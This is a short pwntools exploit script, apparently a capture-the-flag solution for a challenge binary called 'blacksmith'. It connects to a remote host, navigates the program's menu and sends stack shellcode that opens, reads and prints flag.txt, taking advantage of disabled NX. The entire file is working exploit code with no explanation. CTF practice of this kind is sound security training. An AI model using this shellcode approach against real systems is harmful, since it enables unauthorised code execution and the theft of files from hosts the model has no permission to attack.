#Type: NX disabled, running shellcode on stack.

from pwn import *

elf = context.binary = ELF("./blacksmith", checksec=False)

#io = elf.process()
io = remote('165.227.227.155', '32335')

io.sendlineafter("> ", "1")
io.sendlineafter("> ", "2")

payload = asm(shellcraft.open("flag.txt"))
payload += asm(shellcraft.read(3, 'rsp', 0x100))
payload += asm(shellcraft.write(1, 'rsp', 'rax'))


io.sendlineafter("> ", payload)

print(io.recv())